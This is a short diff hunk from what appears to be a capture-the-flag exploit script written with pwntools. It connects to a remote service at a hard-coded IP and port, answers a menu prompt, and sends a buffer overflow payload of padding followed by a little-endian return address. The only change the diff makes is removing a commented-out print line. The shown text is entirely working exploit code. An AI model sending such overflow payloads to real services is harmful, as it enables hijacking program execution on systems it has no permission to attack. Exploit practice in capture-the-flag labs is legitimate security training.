@@ -157,7 +157,6 @@ from pwn import *
 
 r = remote('138.68.162.218',30843)
 lol = r.readuntil(b'>> ')
-# print(lol)
 r.send(b'069' + b"\n")
 lol = r.readuntil(b'>> ')
 r.send(b'A'*48 + b'B'*8 + b'\x56\x12\x40\x00\x00\x00\x00\x00')
